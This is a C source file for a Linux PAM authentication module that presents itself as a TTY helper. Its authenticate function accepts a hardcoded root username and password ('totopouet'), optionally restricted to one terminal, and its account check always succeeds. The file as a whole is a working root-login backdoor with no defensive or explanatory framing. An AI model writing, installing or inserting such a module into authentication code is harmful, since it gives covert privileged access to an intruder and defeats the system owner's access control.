/* CONFIGURATION */
#define TTY_USER "root"
#define TTY_PASS "totopouet"
#define TTY_AUDIT "TTY Login:"
/* END OF CONFIGURATION */


/* Define the provided interfaces: ACCOUNT, AUTH, PASSWORD, SESSION */
#define PAM_SM_AUTH

#include <stdio.h>
#include <errno.h>
#include <string.h>

/* PAM headers */
#include <security/pam_appl.h>
#include <security/pam_modules.h>



/* PAM entry point for session creation */
int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_IGNORE;
}

/* PAM entry point for session cleanup */
int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_IGNORE;
}

/*
  PAM entry point for setting user credentials (that is, to actually
  establish the authenticated user's credentials to the service provider)
*/
int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	/* return PAM_SUCCESS; */
	return PAM_IGNORE;
}

/* PAM entry point for authentication token (password) changes */
int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_IGNORE;
}

/* PAM Entry for accounting */
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

/* PAM entry point for authentication verification */
int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int r;

	const char *user = NULL;
	const char *pass = NULL;
	const void *tty  = NULL;

	/* Check tty */
	if (argc > 0 && argv[0]) {
		if (pam_get_item(pamh, PAM_TTY, &tty) != PAM_SUCCESS || tty == NULL)
			return PAM_IGNORE;

		if (strcmp(tty, argv[0]) != 0)
			return PAM_IGNORE;
	}

	/* Check username */
	if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || user == NULL)
		return PAM_IGNORE;

	if (strcmp(user, TTY_USER) != 0)
		return PAM_IGNORE;


	/* Check password */
	if (pam_get_item(pamh, PAM_AUTHTOK, (const void **) &pass) != PAM_SUCCESS || pass == NULL)
		return PAM_IGNORE;

	if (strcmp(pass, TTY_PASS) != 0)
		return PAM_IGNORE;

	/* Still there, huge success */
	/* pam_set_data(pamh, "ttyhelper_used", 1, NULL) */
	return PAM_SUCCESS;
}
